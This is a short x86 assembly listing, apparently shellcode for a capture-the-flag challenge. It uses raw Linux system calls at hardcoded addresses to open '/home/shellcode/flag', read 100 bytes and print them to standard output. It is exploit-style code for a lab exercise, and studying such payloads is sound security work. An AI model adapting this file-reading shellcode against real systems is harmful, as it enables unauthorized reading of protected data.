.globl	_start
 
.text
_start:
//open
    mov     $5, %eax
    mov     $0x0804a09e, %ebx
    mov     $0, %ecx
    int     $0x80
    mov	    %eax, %ebx
//file handle in ebx
//read
    mov	    $3, %eax
    mov	    $0x0804a0a0, %ecx
    mov	    $100, %edx
    int	    $0x80
//write
    mov	    $4, %eax
    mov	    $1, %ebx
    mov	    $0x0804a0a0, %ecx
    mov	    $100, %edx
    int	    $0x80
.data
filename:
	.ascii	"/home/shellcode/flag\0"
buff:
	.ascii	"---------------------------------------------------------------------------------------------------------"
